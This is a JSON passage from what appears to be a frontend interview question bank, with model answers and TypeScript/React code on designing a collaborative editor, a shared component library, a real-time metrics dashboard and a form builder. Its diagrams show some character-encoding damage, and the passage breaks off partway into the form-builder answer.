{
  "questions": [
    {
      "id": "system-design-001",
      "category": "system-design",
      "difficulty": "senior",
      "question": "Design a real-time collaborative text editor like Google Docs. Focus on the frontend architecture, state synchronization, and conflict resolution.",
      "answer": "## Overview\n\nA real-time collaborative editor requires careful consideration of state synchronization, conflict resolution, and offline support. The frontend architecture must handle multiple users editing the same document simultaneously.\n\n## Core Architecture\n\n### 1. Operational Transformation (OT) vs CRDTs\n\nTwo main approaches for conflict resolution:\n\n**Operational Transformation (OT):**\n- Transforms operations against concurrent operations\n- Requires a central server for transformation\n- Used by Google Docs\n\n**CRDTs (Conflict-free Replicated Data Types):**\n- Operations are commutative and idempotent\n- Can work peer-to-peer\n- Used by Figma, Linear\n\n```typescript\n// CRDT-based text representation using Yjs\nimport * as Y from 'yjs';\nimport { WebsocketProvider } from 'y-websocket';\n\n// Create a shared document\nconst ydoc = new Y.Doc();\n\n// Define the shared text type\nconst ytext = ydoc.getText('editor');\n\n// Connect to sync server\nconst provider = new WebsocketProvider(\n  'wss://sync.example.com',\n  'document-id',\n  ydoc\n);\n\n// Local changes automatically sync\nytext.insert(0, 'Hello, World!');\n```\n\n### 2. State Management Architecture\n\n```typescript\ninterface EditorState {\n  // Local document state\n  document: DocumentNode;\n  \n  // Cursor/selection positions of all users\n  awareness: Map<UserId, AwarenessState>;\n  \n  // Pending operations not yet acknowledged\n  pendingOps: Operation[];\n  \n  // Connection state\n  connectionStatus: 'connected' | 'reconnecting' | 'offline';\n  \n  // Undo/redo stacks (local only)\n  undoStack: Operation[];\n  redoStack: Operation[];\n}\n\ninterface AwarenessState {\n  userId: string;\n  userName: string;\n  cursor: CursorPosition | null;\n  selection: SelectionRange | null;\n  color: string;\n}\n```\n\n### 3. Optimistic Updates with Rollback\n\n```typescript\nclass CollaborativeEditor {\n  private pendingOps: Operation[] = [];\n  private confirmedState: DocumentState;\n  private optimisticState: DocumentState;\n\n  applyLocalOperation(op: Operation) {\n    // 1. Apply optimistically\n    this.optimisticState = applyOperation(this.optimisticState, op);\n    \n    // 2. Add to pending queue\n    this.pendingOps.push(op);\n    \n    // 3. Send to server\n    this.sendToServer(op);\n    \n    // 4. Re-render immediately\n    this.render(this.optimisticState);\n  }\n\n  handleServerAck(confirmedOp: Operation) {\n    // Remove from pending queue\n    this.pendingOps = this.pendingOps.filter(\n      op => op.id !== confirmedOp.id\n    );\n    \n    // Update confirmed state\n    this.confirmedState = applyOperation(\n      this.confirmedState, \n      confirmedOp\n    );\n  }\n\n  handleRemoteOperation(remoteOp: Operation) {\n    // 1. Transform against pending operations\n    let transformedOp = remoteOp;\n    for (const pendingOp of this.pendingOps) {\n      transformedOp = transform(transformedOp, pendingOp);\n    }\n    \n    // 2. Apply to both states\n    this.confirmedState = applyOperation(\n      this.confirmedState, \n      remoteOp\n    );\n    this.optimisticState = applyOperation(\n      this.optimisticState, \n      transformedOp\n    );\n    \n    // 3. Re-render\n    this.render(this.optimisticState);\n  }\n}\n```\n\n### 4. WebSocket Connection Management\n\n```typescript\nclass SyncConnection {\n  private ws: WebSocket | null = null;\n  private reconnectAttempts = 0;\n  private maxReconnectAttempts = 5;\n  private messageQueue: Message[] = [];\n\n  connect() {\n    this.ws = new WebSocket(this.url);\n    \n    this.ws.onopen = () => {\n      this.reconnectAttempts = 0;\n      this.flushMessageQueue();\n    };\n    \n    this.ws.onclose = () => {\n      this.scheduleReconnect();\n    };\n    \n    this.ws.onerror = (error) => {\n      console.error('WebSocket error:', error);\n    };\n  }\n\n  private scheduleReconnect() {\n    if (this.reconnectAttempts >= this.maxReconnectAttempts) {\n      this.enterOfflineMode();\n      return;\n    }\n    \n    // Exponential backoff with jitter\n    const delay = Math.min(\n      1000 * Math.pow(2, this.reconnectAttempts) + \n      Math.random() * 1000,\n      30000\n    );\n    \n    this.reconnectAttempts++;\n    setTimeout(() => this.connect(), delay);\n  }\n\n  send(message: Message) {\n    if (this.ws?.readyState === WebSocket.OPEN) {\n      this.ws.send(JSON.stringify(message));\n    } else {\n      // Queue for when connection restores\n      this.messageQueue.push(message);\n    }\n  }\n}\n```\n\n### 5. Presence and Cursor Rendering\n\n```tsx\nfunction CollaboratorCursors({ awareness }: { awareness: AwarenessState[] }) {\n  return (\n    <>\n      {awareness.map((user) => (\n        <div\n          key={user.userId}\n          className=\"absolute pointer-events-none\"\n          style={{\n            transform: `translate(${user.cursor?.x}px, ${user.cursor?.y}px)`,\n          }}\n        >\n          {/* Cursor caret */}\n          <div \n            className=\"w-0.5 h-5\" \n            style={{ backgroundColor: user.color }} \n          />\n          {/* User name label */}\n          <div\n            className=\"text-xs px-1 rounded whitespace-nowrap\"\n            style={{ backgroundColor: user.color }}\n          >\n            {user.userName}\n          </div>\n        </div>\n      ))}\n    </>\n  );\n}\n```\n\n## Key Considerations\n\n1. **Offline Support**: Queue operations locally, sync when reconnected\n2. **Undo/Redo**: Must be local-only, not affect other users\n3. **Large Documents**: Virtualize rendering, lazy-load sections\n4. **Performance**: Debounce awareness updates, batch operations\n5. **Security**: Validate operations server-side, sanitize content",
      "keyPoints": [
        "Understands OT vs CRDT trade-offs",
        "Can explain optimistic updates with conflict resolution",
        "Knows WebSocket reconnection patterns with exponential backoff",
        "Considers offline support and local-first architecture",
        "Addresses presence/awareness for multi-user UX",
        "Mentions virtualization for large documents"
      ],
      "followUpQuestions": [
        "How would you handle undo/redo in a collaborative context?",
        "What happens when a user has been offline for hours and reconnects?",
        "How would you implement cursor smoothing for remote users?",
        "How would you optimize for a document with 10,000+ users viewing?"
      ],
      "relatedTopics": [
        "websockets",
        "crdt",
        "operational-transformation",
        "optimistic-updates"
      ],
      "source": "seed",
      "commonAt": [
        "Google",
        "Notion",
        "Figma",
        "Linear"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "system-design-002",
      "category": "system-design",
      "difficulty": "senior",
      "question": "Design a component library that will be used by 50+ teams across your organization. How would you architect it for scalability, versioning, and adoption?",
      "answer": "## Overview\n\nA shared component library at scale requires careful architecture around versioning, documentation, testing, and developer experience. The goal is to maximize adoption while maintaining quality and consistency.\n\n## Architecture Decisions\n\n### 1. Monorepo Structure\n\n```\npackages/\nâ”œâ”€â”€ @company/components/        # Core component library\nâ”‚   â”œâ”€â”€ src/\nâ”‚   â”‚   â”œâ”€â”€ components/\nâ”‚   â”‚   â”‚   â”œâ”€â”€ Button/\nâ”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ Button.tsx\nâ”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ Button.test.tsx\nâ”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ Button.stories.tsx\nâ”‚   â”‚   â”‚   â”‚   â””â”€â”€ index.ts\nâ”‚   â”‚   â”‚   â””â”€â”€ ...\nâ”‚   â”‚   â”œâ”€â”€ hooks/\nâ”‚   â”‚   â”œâ”€â”€ utils/\nâ”‚   â”‚   â””â”€â”€ index.ts\nâ”‚   â””â”€â”€ package.json\nâ”œâ”€â”€ @company/tokens/            # Design tokens\nâ”‚   â”œâ”€â”€ src/\nâ”‚   â”‚   â”œâ”€â”€ colors.ts\nâ”‚   â”‚   â”œâ”€â”€ spacing.ts\nâ”‚   â”‚   â”œâ”€â”€ typography.ts\nâ”‚   â”‚   â””â”€â”€ index.ts\nâ”‚   â””â”€â”€ package.json\nâ”œâ”€â”€ @company/icons/             # Icon library\nâ””â”€â”€ @company/themes/            # Theme presets\n```\n\n### 2. Component API Design Philosophy\n\n```typescript\n// Compound component pattern for flexibility\nimport { Button } from '@company/components';\n\n// Simple usage\n<Button>Click me</Button>\n\n// Advanced usage with compound components\n<Button.Group>\n  <Button variant=\"primary\">Save</Button>\n  <Button variant=\"secondary\">Cancel</Button>\n</Button.Group>\n\n// Polymorphic component for semantic HTML\n<Button as=\"a\" href=\"/dashboard\">\n  Go to Dashboard\n</Button>\n```\n\n### 3. Polymorphic Component Implementation\n\n```typescript\nimport { forwardRef, type ElementType, type ComponentPropsWithoutRef } from 'react';\n\ntype PolymorphicProps<E extends ElementType, P = object> = P & {\n  as?: E;\n} & Omit<ComponentPropsWithoutRef<E>, keyof P | 'as'>;\n\ntype ButtonOwnProps = {\n  variant?: 'primary' | 'secondary' | 'ghost';\n  size?: 'sm' | 'md' | 'lg';\n  isLoading?: boolean;\n};\n\ntype ButtonProps<E extends ElementType = 'button'> = PolymorphicProps<E, ButtonOwnProps>;\n\nexport const Button = forwardRef(function Button<E extends ElementType = 'button'>(\n  { as, variant = 'primary', size = 'md', isLoading, children, ...props }: ButtonProps<E>,\n  ref: React.Ref<Element>\n) {\n  const Component = as || 'button';\n  \n  return (\n    <Component\n      ref={ref}\n      className={cn(\n        buttonVariants({ variant, size }),\n        isLoading && 'opacity-50 cursor-not-allowed'\n      )}\n      disabled={isLoading}\n      {...props}\n    >\n      {isLoading ? <Spinner size={size} /> : children}\n    </Component>\n  );\n}) as <E extends ElementType = 'button'>(\n  props: ButtonProps<E> & { ref?: React.Ref<Element> }\n) => React.ReactElement | null;\n```\n\n### 4. Design Token System\n\n```typescript\n// tokens/colors.ts\nexport const colors = {\n  primary: {\n    50: '#eff6ff',\n    100: '#dbeafe',\n    // ...\n    900: '#1e3a8a',\n  },\n  semantic: {\n    success: 'var(--color-success)',\n    warning: 'var(--color-warning)',\n    error: 'var(--color-error)',\n    info: 'var(--color-info)',\n  },\n} as const;\n\n// Generate CSS custom properties\nexport function generateCSSVariables(tokens: typeof colors) {\n  return Object.entries(flattenTokens(tokens))\n    .map(([key, value]) => `--${key}: ${value};`)\n    .join('\\n');\n}\n```\n\n### 5. Versioning Strategy\n\n```json\n{\n  \"name\": \"@company/components\",\n  \"version\": \"2.4.1\",\n  \"peerDependencies\": {\n    \"react\": \"^18.0.0\",\n    \"react-dom\": \"^18.0.0\"\n  }\n}\n```\n\n**Semantic Versioning Rules:**\n- **Major**: Breaking API changes, removed components\n- **Minor**: New components, new props (backward compatible)\n- **Patch**: Bug fixes, style adjustments\n\n**Migration Strategy:**\n```typescript\n// Deprecation pattern\n/** @deprecated Use `variant=\"primary\"` instead. Will be removed in v3.0 */\nexport interface ButtonProps {\n  /** @deprecated */\n  primary?: boolean;\n  variant?: 'primary' | 'secondary';\n}\n\nfunction Button({ primary, variant, ...props }: ButtonProps) {\n  if (primary !== undefined) {\n    console.warn(\n      '[@company/components] Button: \"primary\" prop is deprecated. ' +\n      'Use variant=\"primary\" instead.'\n    );\n  }\n  \n  const resolvedVariant = variant ?? (primary ? 'primary' : 'secondary');\n  // ...\n}\n```\n\n### 6. Testing Strategy\n\n```typescript\n// Visual regression with Chromatic/Percy\n// Unit tests with Testing Library\n// Accessibility tests with jest-axe\n\nimport { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport { axe, toHaveNoViolations } from 'jest-axe';\n\nexpect.extend(toHaveNoViolations);\n\ndescribe('Button', () => {\n  it('renders correctly', () => {\n    render(<Button>Click me</Button>);\n    expect(screen.getByRole('button', { name: 'Click me' })).toBeInTheDocument();\n  });\n\n  it('handles click events', async () => {\n    const onClick = vi.fn();\n    render(<Button onClick={onClick}>Click me</Button>);\n    \n    await userEvent.click(screen.getByRole('button'));\n    expect(onClick).toHaveBeenCalledTimes(1);\n  });\n\n  it('has no accessibility violations', async () => {\n    const { container } = render(<Button>Click me</Button>);\n    const results = await axe(container);\n    expect(results).toHaveNoViolations();\n  });\n});\n```\n\n### 7. Documentation with Storybook\n\n```typescript\n// Button.stories.tsx\nimport type { Meta, StoryObj } from '@storybook/react';\nimport { Button } from './Button';\n\nconst meta: Meta<typeof Button> = {\n  title: 'Components/Button',\n  component: Button,\n  tags: ['autodocs'],\n  argTypes: {\n    variant: {\n      control: 'select',\n      options: ['primary', 'secondary', 'ghost'],\n    },\n  },\n};\n\nexport default meta;\ntype Story = StoryObj<typeof Button>;\n\nexport const Primary: Story = {\n  args: {\n    children: 'Primary Button',\n    variant: 'primary',\n  },\n};\n\nexport const AllVariants: Story = {\n  render: () => (\n    <div className=\"flex gap-4\">\n      <Button variant=\"primary\">Primary</Button>\n      <Button variant=\"secondary\">Secondary</Button>\n      <Button variant=\"ghost\">Ghost</Button>\n    </div>\n  ),\n};\n```\n\n## Adoption Strategy\n\n1. **Champions Program**: Identify early adopters in each team\n2. **Migration Codemods**: Automated migration scripts\n3. **Metrics Dashboard**: Track adoption, bundle size impact\n4. **Office Hours**: Regular support sessions\n5. **Feedback Loop**: GitHub discussions, Slack channel",
      "keyPoints": [
        "Understands monorepo structure benefits",
        "Can implement polymorphic components with TypeScript",
        "Knows semantic versioning and deprecation patterns",
        "Emphasizes testing (unit, visual regression, a11y)",
        "Considers developer experience and adoption",
        "Mentions design tokens for consistency"
      ],
      "followUpQuestions": [
        "How would you handle a breaking change that affects 50 teams?",
        "How do you ensure bundle size doesn't bloat for teams using few components?",
        "How would you implement theming for different brand guidelines?",
        "What metrics would you track to measure library success?"
      ],
      "relatedTopics": [
        "monorepo",
        "semantic-versioning",
        "storybook",
        "design-tokens"
      ],
      "source": "seed",
      "commonAt": [
        "Shopify",
        "Airbnb",
        "Uber",
        "Atlassian"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "system-design-003",
      "category": "system-design",
      "difficulty": "senior",
      "question": "Design a frontend architecture for a dashboard that displays real-time metrics from 100+ data sources, with customizable widgets and layouts.",
      "answer": "## Overview\n\nA real-time dashboard with 100+ data sources requires careful architecture around data aggregation, efficient rendering, and user customization. Key challenges include managing WebSocket connections, preventing UI jank, and persisting user layouts.\n\n## Architecture Overview\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    Dashboard Shell                           â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”‚\nâ”‚  â”‚   Widget    â”‚  â”‚   Widget    â”‚  â”‚   Widget    â”‚         â”‚\nâ”‚  â”‚  (Chart)    â”‚  â”‚  (Table)    â”‚  â”‚   (KPI)     â”‚         â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜         â”‚\nâ”‚         â”‚                â”‚                â”‚                 â”‚\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”         â”‚\nâ”‚  â”‚            Data Subscription Layer            â”‚         â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚\nâ”‚                         â”‚                                   â”‚\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”‚\nâ”‚  â”‚         WebSocket Connection Manager          â”‚         â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                          â”‚\n                    â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”\n                    â”‚  Gateway  â”‚  (Aggregates 100+ sources)\n                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## Core Components\n\n### 1. Data Subscription System\n\n```typescript\n// Pub/sub pattern for efficient data distribution\ntype Subscriber<T> = (data: T) => void;\n\nclass DataSubscriptionManager {\n  private subscriptions = new Map<string, Set<Subscriber<unknown>>>();\n  private latestData = new Map<string, unknown>();\n  private ws: WebSocket | null = null;\n\n  subscribe<T>(channel: string, callback: Subscriber<T>): () => void {\n    if (!this.subscriptions.has(channel)) {\n      this.subscriptions.set(channel, new Set());\n      this.requestChannel(channel);\n    }\n    \n    this.subscriptions.get(channel)!.add(callback as Subscriber<unknown>);\n    \n    // Immediately call with latest data if available\n    if (this.latestData.has(channel)) {\n      callback(this.latestData.get(channel) as T);\n    }\n    \n    // Return unsubscribe function\n    return () => {\n      const subs = this.subscriptions.get(channel);\n      if (subs) {\n        subs.delete(callback as Subscriber<unknown>);\n        if (subs.size === 0) {\n          this.subscriptions.delete(channel);\n          this.releaseChannel(channel);\n        }\n      }\n    };\n  }\n\n  private handleMessage(event: MessageEvent) {\n    const { channel, data } = JSON.parse(event.data);\n    this.latestData.set(channel, data);\n    \n    const subscribers = this.subscriptions.get(channel);\n    if (subscribers) {\n      // Batch updates to prevent excessive re-renders\n      queueMicrotask(() => {\n        subscribers.forEach(callback => callback(data));\n      });\n    }\n  }\n\n  private requestChannel(channel: string) {\n    this.ws?.send(JSON.stringify({ type: 'subscribe', channel }));\n  }\n\n  private releaseChannel(channel: string) {\n    this.ws?.send(JSON.stringify({ type: 'unsubscribe', channel }));\n  }\n}\n\n// React hook for subscriptions\nfunction useDataSubscription<T>(channel: string): T | null {\n  const [data, setData] = useState<T | null>(null);\n  const manager = useContext(DataManagerContext);\n\n  useEffect(() => {\n    return manager.subscribe<T>(channel, setData);\n  }, [channel, manager]);\n\n  return data;\n}\n```\n\n### 2. Virtualized Widget Grid\n\n```typescript\n// Only render widgets in viewport\nimport { useVirtualizer } from '@tanstack/react-virtual';\n\ninterface Widget {\n  id: string;\n  type: WidgetType;\n  position: { x: number; y: number; w: number; h: number };\n  config: WidgetConfig;\n}\n\nfunction DashboardGrid({ widgets }: { widgets: Widget[] }) {\n  const parentRef = useRef<HTMLDivElement>(null);\n  \n  // Calculate which widgets are visible\n  const visibleWidgets = useMemo(() => {\n    return widgets.filter(widget => \n      isInViewport(widget.position, viewportBounds)\n    );\n  }, [widgets, viewportBounds]);\n\n  return (\n    <div \n      ref={parentRef}\n      className=\"relative w-full h-full overflow-auto\"\n    >\n      {visibleWidgets.map(widget => (\n        <WidgetContainer\n          key={widget.id}\n          widget={widget}\n          style={{\n            position: 'absolute',\n            left: widget.position.x * GRID_SIZE,\n            top: widget.position.y * GRID_SIZE,\n            width: widget.position.w * GRID_SIZE,\n            height: widget.position.h * GRID_SIZE,\n          }}\n        />\n      ))}\n    </div>\n  );\n}\n```\n\n### 3. Widget Component Architecture\n\n```typescript\n// Widget registry pattern\nconst WIDGET_REGISTRY: Record<WidgetType, React.LazyExoticComponent<WidgetComponent>> = {\n  'line-chart': lazy(() => import('./widgets/LineChartWidget')),\n  'bar-chart': lazy(() => import('./widgets/BarChartWidget')),\n  'kpi-card': lazy(() => import('./widgets/KPICardWidget')),\n  'data-table': lazy(() => import('./widgets/DataTableWidget')),\n  'heatmap': lazy(() => import('./widgets/HeatmapWidget')),\n};\n\ninterface WidgetProps<T = unknown> {\n  config: T;\n  data: unknown;\n  isEditing: boolean;\n  onConfigChange: (config: T) => void;\n}\n\nfunction WidgetContainer({ widget }: { widget: Widget }) {\n  const data = useDataSubscription(widget.config.dataSource);\n  const Component = WIDGET_REGISTRY[widget.type];\n\n  return (\n    <ErrorBoundary fallback={<WidgetError />}>\n      <Suspense fallback={<WidgetSkeleton />}>\n        <Component\n          config={widget.config}\n          data={data}\n          isEditing={false}\n          onConfigChange={() => {}}\n        />\n      </Suspense>\n    </ErrorBoundary>\n  );\n}\n```\n\n### 4. Layout Persistence\n\n```typescript\n// Layout state with optimistic updates\ninterface DashboardLayout {\n  id: string;\n  name: string;\n  widgets: Widget[];\n  gridConfig: GridConfig;\n  updatedAt: string;\n}\n\nasync function saveLayout(layout: DashboardLayout): Promise<void> {\n  // Debounced auto-save\n  await fetch('/api/layouts/' + layout.id, {\n    method: 'PUT',\n    body: JSON.stringify(layout),\n  });\n}\n\n// Zustand store for layout state\nconst useDashboardStore = create<DashboardStore>()(\n  persist(\n    (set, get) => ({\n      layout: null,\n      isDirty: false,\n      \n      updateWidgetPosition: (widgetId, position) => {\n        set(state => ({\n          layout: {\n            ...state.layout!,\n            widgets: state.layout!.widgets.map(w =>\n              w.id === widgetId ? { ...w, position } : w\n            ),\n          },\n          isDirty: true,\n        }));\n        \n        // Debounced save\n        debouncedSave(get().layout!);\n      },\n      \n      addWidget: (type, config) => {\n        const widget: Widget = {\n          id: nanoid(),\n          type,\n          position: findEmptyPosition(get().layout!.widgets),\n          config,\n        };\n        \n        set(state => ({\n          layout: {\n            ...state.layout!,\n            widgets: [...state.layout!.widgets, widget],\n          },\n          isDirty: true,\n        }));\n      },\n    }),\n    {\n      name: 'dashboard-layout',\n      storage: createJSONStorage(() => localStorage),\n    }\n  )\n);\n```\n\n### 5. Performance Optimizations\n\n```typescript\n// 1. Throttle high-frequency updates\nfunction useThrottledData<T>(channel: string, interval = 100): T | null {\n  const rawData = useDataSubscription<T>(channel);\n  const [throttledData, setThrottledData] = useState<T | null>(null);\n  \n  useEffect(() => {\n    const timer = setInterval(() => {\n      setThrottledData(rawData);\n    }, interval);\n    \n    return () => clearInterval(timer);\n  }, [rawData, interval]);\n  \n  return throttledData;\n}\n\n// 2. Web Worker for data transformation\nconst chartWorker = new Worker(\n  new URL('./workers/chart-transform.worker.ts', import.meta.url)\n);\n\nfunction useTransformedData(rawData: DataPoint[], config: TransformConfig) {\n  const [result, setResult] = useState<TransformedData | null>(null);\n  \n  useEffect(() => {\n    chartWorker.postMessage({ rawData, config });\n    \n    const handler = (e: MessageEvent) => setResult(e.data);\n    chartWorker.addEventListener('message', handler);\n    \n    return () => chartWorker.removeEventListener('message', handler);\n  }, [rawData, config]);\n  \n  return result;\n}\n\n// 3. Memoized chart rendering\nconst LineChartWidget = memo(function LineChartWidget({ \n  data, \n  config \n}: WidgetProps<LineChartConfig>) {\n  const chartData = useTransformedData(data, config.transform);\n  \n  return (\n    <ResponsiveContainer>\n      <LineChart data={chartData}>\n        {/* Chart configuration */}\n      </LineChart>\n    </ResponsiveContainer>\n  );\n}, (prev, next) => {\n  // Custom comparison - only re-render if data changed significantly\n  return isEqual(prev.data, next.data) && isEqual(prev.config, next.config);\n});\n```\n\n## Key Considerations\n\n1. **Connection Multiplexing**: Single WebSocket with channel subscriptions\n2. **Backpressure Handling**: Drop frames if UI can't keep up\n3. **Offline Mode**: Cache last known values, show stale indicators\n4. **Memory Management**: Limit data history, use ring buffers\n5. **Accessibility**: Ensure widgets are keyboard navigable",
      "keyPoints": [
        "Understands pub/sub pattern for data distribution",
        "Implements proper cleanup with unsubscribe functions",
        "Uses virtualization for large widget grids",
        "Knows code-splitting with lazy loading",
        "Applies throttling/debouncing for high-frequency updates",
        "Considers Web Workers for heavy computation"
      ],
      "followUpQuestions": [
        "How would you handle a widget that needs data from multiple sources?",
        "What if the WebSocket connection is unreliable?",
        "How would you implement dashboard sharing between users?",
        "How do you handle widgets that crash without affecting others?"
      ],
      "relatedTopics": [
        "websockets",
        "virtualization",
        "code-splitting",
        "state-management"
      ],
      "source": "seed",
      "commonAt": [
        "Datadog",
        "Grafana",
        "New Relic",
        "Splunk"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "system-design-004",
      "category": "system-design",
      "difficulty": "mid",
      "question": "How would you architect a form builder that allows users to create complex, multi-step forms with validation, conditional logic, and file uploads?",
      "answer": "## Overview\n\nA form builder requires a flexible schema-driven architecture that separates form definition from rendering. The key is designing a JSON schema that can express complex field relationships while keeping the runtime performant.\n\n## Core Data Model\n\n```typescript\n// Form schema that drives the entire UI\ninterface FormSchema {\n  id: string;\n  title: string;\n  steps: FormStep[];\n  settings: FormSettings;\n}\n\ninterface FormStep {\n  id: string;\n  title: string;\n  description?: string;\n  fields: FormField[];\n  conditions?: StepCondition[]; // When to show this step\n}\n\ntype FormField = \n  | TextField \n  | SelectField \n  | FileField \n  | GroupField\n  | RepeaterField;\n\ninterface BaseField {\n  id: string;\n  type: string;\n  label: string;\n  required?: boolean;\n  helpText?: string;\n  conditions?: FieldCondition[];\n  validation?: ValidationRule[];\n}\n\ninterface TextField extends BaseField {\n  type: 'text' | 'email' | 'tel' | 'textarea';\n  placeholder?: string;\n  minLength?: number;\n  maxLength?: number;\n  pattern?: string;\n}\n\ninterface SelectField extends BaseField {\n  type: 'select' | 'radio' | 'checkbox';\n  options: SelectOption[];\n  multiple?: boolean;\n}\n\ninterface FileField extends BaseField {\n  type: 'file';\n  accept?: string[];\n  maxSize?: number; // bytes\n  maxFiles?: number;\n}\n\ninterface GroupField extends BaseField {\n  type: 'group';\n  fields: FormField[]; // Nested fields\n}\n\ninterface RepeaterField extends BaseField {\n  type: 'repeater';\n  fields: FormField[]; // Template for each item\n  minItems?: number;\n  maxItems?: number;\n}\n```\n\n## Conditional Logic Engine\n\n```typescript\ninterface FieldCondition {\n  field: string; // Field ID to watch\n  operator: 'equals' | 'notEquals' | 'contains' | 'greaterThan' | 'isEmpty';\n  value: unknown;\n  action: 'show' | 'hide' | 'require' | 'disable';\n}\n\nfunction evaluateCondition(\n  condition: FieldCondition,\n  formValues: Record<string, unknown>\n): boolean {\n  const fieldValue = formValues[condition.field];\n  \n  switch (condition.operator) {\n    case 'equals':\n      return fieldValue === condition.value;\n    case 'notEquals':\n      return fieldValue !== condition.value;\n    case 'contains':\n      return String(fieldValue).includes(String(condition.value));\n    case 'greaterThan':\n      return Number(fieldValue) > Number(condition.value);\n    case 'isEmpty':\n      return !fieldValue || (Array.isArray(fieldValue) && fieldValue.length === 0);\n    default:\n      return true;\n  }\n}\n\nfunction useConditionalFields(\n  fields: FormField[],\n  formValues: Record<string, unknown>\n): FormField[] {\n  return useMemo(() => {\n    return fields.filter(field => {\n      if (!field.conditions?.length) return true;\n      \n      return field.conditions.every(condition => {\n        const result = evaluateCondition(condition, formValues);\n        return condition.action === 'show' ? result : !result;\n      });\n    });\n  }, [fields, formValues]);\n}\n```\n\n## Validation System\n\n```typescript\nimport { z } from 'zod';\n\ninterface ValidationRule {\n  type: 'required' | 'minLength' | 'maxLength' | 'pattern' | 'custom';\n  value?: unknown;\n  message: string;\n}\n\n// Generate Zod schema from field definition\nfunction createFieldSchema(field: FormField): z.ZodTypeAny {\n  let schema: z.ZodTypeAny;\n  \n  switch (field.type) {\n    case 'text':\n    case 'email':\n    case 'tel':\n    case 'textarea':\n      schema = z.string();\n      if (field.type === 'email') {\n        schema = (schema as z.ZodString).email(field.validation?.find(v => v.type === 'pattern')?.message);\n      }\n      if (field.minLength) {\n        schema = (schema as z.ZodString).min(field.minLength);\n      }\n      if (field.maxLength) {\n        schema = (schema as z.ZodString).max(field.maxLength);\n      }\n      break;\n      \n    case 'select':\n    case 'radio':\n      schema = z.string();\n      break;\n      \n    case 'checkbox':\n      schema = field.multiple ? z.array(z.string()) : z.boolean();\n      break;\n      \n    case 'file':\n      schema = z.array(z.instanceof(File)).max(field.maxFiles ?? 10);\n      break;\n      \n    case 'repeater':\n      const itemSchema = z.object(\n        Object.fromEntries(\n          field.fields.map(f => [f.id, createFieldSchema(f)])\n        )\n      );\n      schema = z.array(itemSchema);\n      if (field.minItems) schema = (schema as z.ZodArray<typeof itemSchema>).min(field.minItems);\n      if (field.maxItems) schema = (schema as z.ZodArray<typeof itemSchema>).max(field.maxItems);\n      break;\n      \n    default:\n      schema = z.unknown();\n  }\n  \n  return field.required ? schema : schema.optional();\n}\n\nfunction createFormSchema(formSchema: FormSchema): z.ZodObject<Record<string, z.ZodTypeAny>> {\n  const fields = formSchema.steps.flatMap(step => step.fields);\n  const shape: Record<string, z.ZodTypeAny> = {};\n  \n  for (const field of fields) {\n    shape[field.id] = createFieldSchema(field);\n  }\n  \n  return z.object(shape);\n}\n```\n\n## File Upload 